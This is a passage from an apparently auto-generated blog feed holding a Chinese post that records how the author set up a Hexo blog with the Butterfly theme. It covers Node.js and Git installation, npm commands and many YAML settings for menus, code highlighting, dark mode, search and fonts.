            <tag> MMD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站配置记录</title>
      <link href="/posts/dd9c034b.html"/>
      <url>/posts/dd9c034b.html</url>
      
        <content type="html"><![CDATA[<h1 id="网站配置记录"><a href="#网站配置记录" class="headerlink" title="网站配置记录"></a>网站配置记录</h1><blockquote><p>配置参考教程：<a href="https://www.fomal.cc/posts/eec9786.html">author::博客魔改教程总结(一) | Fomalhaut🥝</a></p></blockquote><hr><h2 id="〇、环境配置"><a href="#〇、环境配置" class="headerlink" title="〇、环境配置"></a>〇、环境配置</h2><h3 id="Node-js-Git"><a href="#Node-js-Git" class="headerlink" title="Node.js+Git"></a>Node.js+Git</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><a href="https://nodejs.org/en/download">official::Download | Node.js (nodejs.org)</a></p><p><a href="https://blog.csdn.net/WHF__/article/details/129362462">author::Node.js下载安装及环境配置教程</a></p><p>安装过程中不选中Automatically install the necessary tools.其他默认。</p><p>测试可以在控制台输入<code>node -v</code>和<code>npm -v</code>，返回版本就是安装成功。</p><p>然后再node.js下创建两个文件并配置路径，文件名为node_global，node_cache，命令如下：</p><ul><li><p><code>npm config set prefix &quot;D:\Node.js\node_global&quot;</code></p></li><li><p><code>npm config set cache &quot;D:\Node.js\node_cache&quot;</code></p></li></ul><p>然后配置环境变量。</p><p>系统变量配置：</p><ul><li><p>新增NODE_PATH：<code>D:\nodejs\node_global\node_modules</code>（此时会在文件夹中自动生成node_modules，没有则自己手动创建）</p></li><li><p>在Path中添加：<code>%NODE_PATH%</code></p></li></ul><p>用户变量配置</p><ul><li>在Path中修改：<code>...npm</code>的路径改为<code>D:\Node.js\node_global</code></li></ul><p>之后安装时带<code>-g</code>表示会全局安装，安装到node_global中。</p><hr><p><a href="https://git-scm.com/download/win">official::Git - Downloading Package (git-scm.com)</a></p><p>全点下一步。</p>              </div>            </details><h3 id="hexo-butterfly"><a href="#hexo-butterfly" class="headerlink" title="hexo+butterfly"></a>hexo+butterfly</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p>全局安装hexo框架：<code>npm install hexo -g</code></p><p>当前目标生成demo（注意安装前记得切换目录）：<code>hexo init demoblog</code></p><p>在demoblog下用git下载butterfly：<code>git clone -b master https://gitee.com/immyw/hexo-theme-butterfly.git themes/butterfly</code></p><p>启动hexo：<code>hexo s -p 8080</code></p>              </div>            </details><hr><h2 id="一、简单文件配置"><a href="#一、简单文件配置" class="headerlink" title="一、简单文件配置"></a>一、简单文件配置</h2><h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>site</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5行</span></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Magialeaf的小窝</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">欢迎来到我的小窝！</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Maigaleaf</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br></pre></td></tr></table></figure></li><li><p>url</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 14行</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span>  <span class="string">http://Magialeaf.github.io</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure></li><li><p>跳过渲染</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 35行，跳过作品栏的渲染</span></span><br><span class="line"><span class="attr">skip_render:</span> [<span class="string">works/Games/**</span>]</span><br></pre></td></tr></table></figure></li><li><p>解析文件名</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 38行</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 50行</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">prismjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>主题</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 106行</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="butterfly配置"><a href="#butterfly配置" class="headerlink" title="butterfly配置"></a>butterfly配置</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <ol><li><p>目录</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约11行</span></span><br><span class="line"><span class="comment"># Menu 目錄</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-graduation-cap</span> <span class="string">||</span> <span class="attr">hide:</span></span><br><span class="line">    <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">归档:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">作品</span> <span class="string">||</span> <span class="string">fa-solid</span> <span class="string">fa-bookmark</span> <span class="string">||</span> <span class="attr">hide:</span></span><br><span class="line">    <span class="string">作品集:</span> <span class="string">/works/</span> <span class="string">||</span> <span class="string">fa-sharp</span> <span class="string">fa-solid</span> <span class="string">fa-star</span></span><br><span class="line">  <span class="string">社区</span> <span class="string">||</span> <span class="string">fa-solid</span> <span class="string">fa-comment</span> <span class="string">||</span> <span class="attr">hide:</span></span><br><span class="line">    <span class="string">留言板:</span> <span class="string">/comments/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-envelope-open</span></span><br><span class="line">  <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-heart</span>  </span><br></pre></td></tr></table></figure></li><li><p>代码样式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约39行</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">mac</span> <span class="comment">#  darker / pale night / light / ocean / mac / mac light / false</span></span><br><span class="line"><span class="attr">highlight_copy:</span> <span class="literal">true</span> <span class="comment"># copy button</span></span><br><span class="line"><span class="attr">highlight_lang:</span> <span class="literal">true</span> <span class="comment"># show the code language</span></span><br><span class="line"><span class="attr">highlight_shrink:</span> <span class="literal">false</span> <span class="comment"># true: shrink the code blocks / false: expand the code blocks | none: expand code blocks and hide the button</span></span><br><span class="line"><span class="attr">highlight_height_limit:</span> <span class="literal">false</span> <span class="comment"># unit: px</span></span><br><span class="line"><span class="attr">code_word_wrap:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>头像栏</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约46行</span></span><br><span class="line"><span class="comment"># Social Settings (社交圖標設置)</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line"><span class="comment"># Image (圖片設置)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="comment"># Favicon（網站圖標）</span></span><br><span class="line"><span class="attr">favicon:</span></span><br><span class="line"><span class="comment"># Avatar (頭像)</span></span><br><span class="line"><span class="attr">avatar:</span></span><br></pre></td></tr></table></figure></li><li><p>文章封面</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约96行</span></span><br><span class="line"><span class="attr">cover:</span></span><br><span class="line">  <span class="comment"># display the cover or not (是否顯示文章封面)</span></span><br><span class="line">  <span class="attr">index_enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">aside_enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">archives_enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># the position of cover in home page (封面顯示的位置)</span></span><br><span class="line">  <span class="comment"># left/right/both</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">both</span></span><br><span class="line">  <span class="comment"># When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span></span><br><span class="line">  <span class="attr">default_cover:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace Broken Images (替換無法顯示的圖片)</span></span><br><span class="line"><span class="attr">error_img:</span></span><br><span class="line">  <span class="attr">flink:</span> <span class="string">/img/friend_404.gif</span></span><br><span class="line">  <span class="attr">post_page:</span> <span class="string">/img/error.png</span> <span class="comment"># /img/404.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A simple 404 page</span></span><br><span class="line"><span class="attr">error_404:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">subtitle:</span> <span class="string">&#x27;页面没有找到&#x27;</span></span><br><span class="line">  <span class="attr">background:</span> <span class="string">/img/404.jpg</span></span><br></pre></td></tr></table></figure></li><li><p>文章信息</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">page:</span> <span class="comment"># Home Page</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment"># created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">date</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 主頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">false</span> <span class="comment"># true or false 主頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br><span class="line">  <span class="attr">post:</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment"># created or updated or both 文章頁日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">relative</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br></pre></td></tr></table></figure></li><li><p>copy</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约168行，开启超过字数限制会自带版权提示</span></span><br><span class="line"><span class="comment"># copy settings</span></span><br><span class="line"><span class="comment"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span></span><br><span class="line"><span class="attr">copy:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit_count:</span> <span class="number">50</span></span><br></pre></td></tr></table></figure></li><li><p>toc</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约179行</span></span><br><span class="line"><span class="comment"># toc (目錄)</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">page:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span> <span class="comment"># 关闭，不然在我的目录号前还会有目录号</span></span><br><span class="line">  <span class="attr">expand:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">style_simple:</span> <span class="literal">false</span> <span class="comment"># for post</span></span><br><span class="line">  <span class="attr">scroll_percent:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>reward</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约196行，打赏</span></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">QR_code:</span></span><br></pre></td></tr></table></figure></li><li><p>推荐文章</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约214行</span></span><br><span class="line"><span class="comment"># Related Articles</span></span><br><span class="line"><span class="attr">related_post:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">6</span> <span class="comment"># Number of posts displayed</span></span><br><span class="line">  <span class="attr">date_type:</span> <span class="string">updated</span> <span class="comment"># or created or updated 文章日期顯示創建日或者更新日</span></span><br></pre></td></tr></table></figure></li><li><p>文章过期提醒</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约227行</span></span><br><span class="line"><span class="comment"># Displays outdated notice for a post (文章過期提醒)</span></span><br><span class="line"><span class="attr">noticeOutdate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">flat</span> <span class="comment"># style: simple/flat</span></span><br><span class="line">  <span class="attr">limit_day:</span> <span class="number">365</span> <span class="comment"># When will it be shown</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span> <span class="comment"># position: top/bottom</span></span><br><span class="line">  <span class="attr">message_prev:</span> <span class="string">距离上次更新已经过去</span></span><br><span class="line">  <span class="attr">message_next:</span> <span class="string">天了，文章内容可能已经过期！</span></span><br></pre></td></tr></table></figure></li><li><p>footer</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约236行</span></span><br><span class="line"><span class="comment"># Footer Settings</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">owner:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">since:</span> <span class="number">2023</span></span><br><span class="line">  <span class="attr">custom_text:</span> <span class="string">版本V1.0</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="literal">false</span> <span class="comment"># Copyright of theme and framework</span></span><br></pre></td></tr></table></figure></li><li><p>aside</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约248行</span></span><br><span class="line"><span class="comment"># 侧边栏显示的信息</span></span><br><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">    <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">&lt;card_announce_top&gt;当前网站版本为V1.0&lt;br</span> <span class="string">/&gt;&lt;/card_announce_top&gt;</span></span><br><span class="line">      <span class="string">&lt;card_announce_content&gt;</span></span><br><span class="line">      <span class="number">1</span><span class="string">.这里大多数文章是我之前随意记的笔记，可能格式以及对网站的适配性有点不好。&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="number">2</span><span class="string">.并且文章大多数都类似于思维导图，没有太详细的内容。&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="number">3</span><span class="string">.之后会完善一些之前写的文章，以及写一些详细的文章放到网站上。&lt;br</span> <span class="string">/&gt;&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&lt;/card_announce_content&gt;</span></span><br><span class="line">      <span class="string">&lt;card_announce_tip&gt;</span></span><br><span class="line">      <span class="string">文章链接为紫色，链接前缀如下：&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">1</span><span class="string">.无前缀（百科或其他作者的链接）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">2.</span><span class="string">author::（文章中引用了许多该作者的内容）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">3.</span><span class="string">official::（官网链接）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">4.</span><span class="string">text::（我的其他文本）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&amp;nbsp;</span> <span class="number">5.</span><span class="string">my::（我的库或其他链接）&lt;br</span> <span class="string">/&gt;</span></span><br><span class="line">      <span class="string">&lt;/card_announce_tip&gt;</span></span><br><span class="line"><span class="comment"># 其他如card_categories,card_tags,card_archives设置为false</span></span><br></pre></td></tr></table></figure></li><li><p>简繁切换</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约336行</span></span><br><span class="line"><span class="comment"># Conversion between Traditional and Simplified Chinese (簡繁轉換)</span></span><br><span class="line"><span class="attr">translate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>阅读模式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约350行</span></span><br><span class="line"><span class="comment"># Read Mode (閲讀模式)</span></span><br><span class="line"><span class="attr">readmode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>黑夜模式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约354行</span></span><br><span class="line"><span class="comment"># dark mode</span></span><br><span class="line"><span class="attr">darkmode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">autoChangeMode:</span> <span class="number">2</span> <span class="comment">#模式2，在晚上18点到早上6点的时间自动切换成黑夜模式</span></span><br></pre></td></tr></table></figure></li><li><p>mathjax</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约385行，要安装插件，如下</span></span><br><span class="line"><span class="comment"># npm uninstall hexo-renderer-marked --save</span></span><br><span class="line"><span class="comment"># npm install hexo-renderer-kramed --save</span></span><br><span class="line"><span class="comment"># MathJax</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li><li><p>本地搜索</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约407行</span></span><br><span class="line"><span class="comment"># 可能要npm install hexo-generator-search -g</span></span><br><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">True</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br></pre></td></tr></table></figure></li><li><p>主题色</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约653行</span></span><br><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">main:</span> <span class="string">&quot;#49B1F5&quot;</span></span><br><span class="line">  <span class="attr">paginator:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">button_hover:</span> <span class="string">&quot;#FF7242&quot;</span></span><br><span class="line">  <span class="attr">text_selection:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">link_color:</span> <span class="string">&quot;#DA20D8&quot;</span>      <span class="comment"># 超链接颜色</span></span><br><span class="line">  <span class="attr">meta_color:</span> <span class="string">&quot;#858585&quot;</span></span><br><span class="line">  <span class="attr">hr_color:</span> <span class="string">&quot;#A4D8FA&quot;</span></span><br><span class="line">  <span class="attr">code_foreground:</span> <span class="string">&quot;#F47466&quot;</span></span><br><span class="line">  <span class="attr">code_background:</span> <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">  <span class="attr">toc_color:</span> <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">  <span class="attr">blockquote_padding_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">blockquote_background_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">scrollbar_color:</span> <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">  <span class="attr">meta_theme_color_light:</span> <span class="string">&quot;ffffff&quot;</span></span><br><span class="line">  <span class="attr">meta_theme_color_dark:</span> <span class="string">&quot;#0d0d0d&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>网站背景和页脚</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约687行</span></span><br><span class="line"><span class="comment"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span></span><br><span class="line"><span class="attr">background:</span> <span class="string">url(/img/background.jpg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer Background</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>背景彩带</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约726行</span></span><br><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&#x27;0,0,255&#x27;</span> <span class="comment">#color of lines, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(<span class="doctag">note:</span> use &#x27;,&#x27; to separate.)</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.7</span> <span class="comment"># the opacity of line (0~1), default: 0.5.</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background, default: -1.</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">40</span> <span class="comment"># the number of lines, default: 99.</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">true</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>水平分割线和字体</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约760行</span></span><br><span class="line"><span class="comment"># Beautify (美化頁面顯示)</span></span><br><span class="line"><span class="attr">beautify:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开启才有水平分割线，下面的标题前的符号可以注释掉</span></span><br><span class="line">  <span class="comment"># field: site # site/post</span></span><br><span class="line">  <span class="comment"># title-prefix-icon: &#x27;&#x27; # &#x27;\f0c1&#x27; </span></span><br><span class="line">  <span class="comment"># title-prefix-icon-color: &#x27;&#x27;  # &#x27;#F47466&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span> <span class="string">&#x27;15.5px&#x27;</span></span><br><span class="line">  <span class="attr">code-font-size:</span> <span class="string">&#x27;14.5px&#x27;</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">YSHST,</span> <span class="string">-apple-system,</span> <span class="string">&#x27;Quicksand&#x27;</span><span class="string">,</span> <span class="string">&#x27;Nimbus Roman No9 L&#x27;</span><span class="string">,</span> <span class="string">&#x27;PingFang SC&#x27;</span><span class="string">,</span> <span class="string">&#x27;Hiragino Sans GB&#x27;</span><span class="string">,</span> <span class="string">&#x27;Noto Serif SC&#x27;</span><span class="string">,</span> <span class="string">&#x27;Microsoft Yahei&#x27;</span><span class="string">,</span> <span class="string">&#x27;WenQuanYi Micro Hei&#x27;</span><span class="string">,</span> <span class="string">&#x27;ST Heiti&#x27;</span><span class="string">,</span> <span class="string">sans-serif;</span></span><br><span class="line">  <span class="attr">code-font-family:</span> <span class="string">Consolas_1,</span> <span class="string">YSHST,</span> <span class="string">&quot;Microsoft YaHei&quot;</span><span class="string">,</span> <span class="string">Menlo,</span> <span class="string">&quot;PingFang SC&quot;</span><span class="string">,</span> <span class="string">&quot;Microsoft JhengHei&quot;</span><span class="string">,</span> <span class="string">sans-serif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Font settings for the site title and site subtitle</span></span><br><span class="line"><span class="comment"># 左上角網站名字 主頁居中網站名字</span></span><br><span class="line"><span class="attr">blog_title_font:</span></span><br><span class="line">  <span class="attr">font_link:</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">YSHST</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The setting of divider icon (水平分隔線圖標設置)</span></span><br><span class="line"><span class="attr">hr_icon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">&#x27;\f2dc&#x27;</span> <span class="comment"># the unicode value of Font Awesome icon, such as &#x27;\3423&#x27;</span></span><br><span class="line">  <span class="attr">icon-top:</span> <span class="string">-10px</span></span><br></pre></td></tr></table></figure></li><li><p>主页副标题</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约787行</span></span><br><span class="line"><span class="comment"># the subtitle on homepage (主頁subtitle)</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">True</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">typed_option:</span></span><br><span class="line">  <span class="attr">source:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">欢迎来到我的小窝</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">立于浮华之世，奏响天籁之音</span></span><br></pre></td></tr></table></figure></li><li><p>字数统计</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 817行</span></span><br><span class="line"><span class="comment"># wordcount (字數統計)</span></span><br><span class="line"><span class="comment"># see https://butterfly.js.org/posts/ceeb73f/#字數統計</span></span><br><span class="line"><span class="attr">wordcount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_wordcount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_wordcount:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>弹窗关闭</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">snackbar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top-left</span></span><br><span class="line">  <span class="attr">bg_light:</span> <span class="string">&#x27;#49b1f5&#x27;</span> <span class="comment"># The background color of Toast Notification in light mode</span></span><br><span class="line">  <span class="attr">bg_dark:</span> <span class="string">&#x27;#1f1f1f&#x27;</span> <span class="comment"># The background color of Toast Notification in dark mode</span></span><br></pre></td></tr></table></figure></li><li><p>中英文空格</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约902行</span></span><br><span class="line"><span 